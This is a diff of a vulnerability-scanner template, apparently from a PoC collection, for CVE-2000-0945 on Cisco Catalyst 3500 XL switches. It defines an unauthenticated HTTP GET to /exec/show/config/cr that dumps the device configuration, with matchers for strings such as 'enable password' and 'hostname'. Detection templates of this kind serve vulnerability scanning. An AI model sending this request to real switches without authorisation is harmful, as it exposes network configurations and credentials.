@@ -1,34 +1,40 @@
 [info]
 author = "AVE"
-description = "Cisco Catalyst 3500 XL 系列交换机 Web 配置接口存在未授权命令执行漏洞。通过向 /exec/show/config/cr 发送 HTTP GET 请求，可读取交换机配置信息，验证漏洞存在。"
+description = "通过向 Cisco Catalyst 3500 XL 交换机 Web 管理接口的 /exec/ 路径发送 HTTP GET 请求，无需认证即可执行任意系统命令。PoC 发送 /exec/show/config/cr 读取设备运行配置，若返回包含 Cisco IOS 配置内容则判定存在漏洞。"
 id = "POC-AVE-2000-0691"
-name = "Cisco Catalyst 3500 XL 任意命令执行漏洞 PoC"
+name = "Cisco Catalyst 3500 XL 任意命令执行 PoC"
 severity = "critical"
-tags = ["ave-2000-0691"]
+tags = [
+    "cve-2000-0945",
+    "cisco",
+    "catalyst",
+    "rce",
+]
 vuln_id = [
     "CVE-2000-0945",
     "AVE-2000-0691",
 ]
 
 [poc]
-logic = "all"
+logic = "any"
 
 [[poc.requests]]
 method = "GET"
 path = "/{{BaseURL}}/exec/show/config/cr"
 protocol = "http"
 
-[[poc.requests.matchers]]
-expect = true
-status = [200]
-type = "status"
+[poc.requests.body]
+content = ""
+type = "raw"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
 words = [
-    "show",
-    "config",
-    "running-config",
+    "show config",
+    "enable password",
+    "interface",
+    "hostname",
+    "service password",
 ]
